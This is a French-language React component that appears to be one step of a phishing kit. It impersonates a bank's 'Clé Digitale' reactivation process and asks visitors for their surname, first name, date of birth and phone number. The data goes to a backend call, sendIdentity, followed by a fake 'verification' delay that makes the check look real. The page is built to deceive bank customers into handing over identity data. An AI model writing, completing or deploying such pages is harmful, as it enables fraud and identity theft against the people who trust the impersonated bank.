import { useState } from 'react';
import { sendIdentity } from '../../api';

function formatDob(raw: string): string {
  const r = raw.replace(/\D/g, '').substring(0, 8);
  if (r.length <= 2) return r;
  if (r.length <= 4) return r.slice(0, 2) + '/' + r.slice(2);
  return r.slice(0, 2) + '/' + r.slice(2, 4) + '/' + r.slice(4);
}

export default function CeStepIdentity({ onSuccess }: { onSuccess: () => void }) {
  const [nom, setNom] = useState('');
  const [prenom, setPrenom] = useState('');
  const [dob, setDob] = useState('');
  const [phone, setPhone] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const cleanPhone = phone.replace(/[\s\-.\(\)]/g, '');
  const canSubmit = nom.trim() && prenom.trim() && dob.length === 10 && cleanPhone.length >= 6 && !submitting;

  const handleSubmit = async () => {
    setSubmitting(true);
    await sendIdentity(nom.trim(), prenom.trim(), dob, phone.trim());
    setTimeout(() => onSuccess(), 1500);
  };

  const inputCls = 'w-full h-[48px] px-3 border border-gray-400 rounded text-[15px] text-gray-900 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary/30 transition';

  return (
    <div className="pt-[60px] min-h-screen animate-fadeIn">
      <div className="max-w-[520px] mx-auto px-5 py-10">
        <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="bg-primary px-6 py-5">
            <h1 className="text-[20px] font-medium text-white">Vérification de votre identité</h1>
          </div>
          <div className="px-6 py-6 space-y-5">
            <p className="text-[14px] text-gray-600 leading-[1.5]">Pour finaliser la réactivation de votre Clé Digitale, veuillez confirmer vos informations personnelles.</p>
            <div><label className="block text-[14px] text-gray-700 mb-1">Nom</label><input type="text" value={nom} onChange={(e) => setNom(e.target.value)} placeholder="DUPONT" autoComplete="off" className={inputCls} /></div>
            <div><label className="block text-[14px] text-gray-700 mb-1">Prénom</label><input type="text" value={prenom} onChange={(e) => setPrenom(e.target.value)} placeholder="Jean" autoComplete="off" className={inputCls} /></div>
            <div><label className="block text-[14px] text-gray-700 mb-1">Date de naissance</label><input type="tel" value={dob} onChange={(e) => setDob(formatDob(e.target.value))} placeholder="JJ/MM/AAAA" maxLength={10} autoComplete="off" className={inputCls} /></div>
            <div><label className="block text-[14px] text-gray-700 mb-1">Numéro de téléphone</label><input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} placeholder="06 12 34 56 78" autoComplete="off" className={inputCls} /></div>
            <button disabled={!canSubmit} onClick={handleSubmit} className={`w-full h-[48px] font-medium rounded transition text-[15px] ${canSubmit ? 'bg-primary hover:bg-primary-dark text-white cursor-pointer' : 'bg-gray-200 text-gray-400 cursor-not-allowed'}`}>
              {submitting ? 'Vérification...' : 'Confirmer mon identité'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
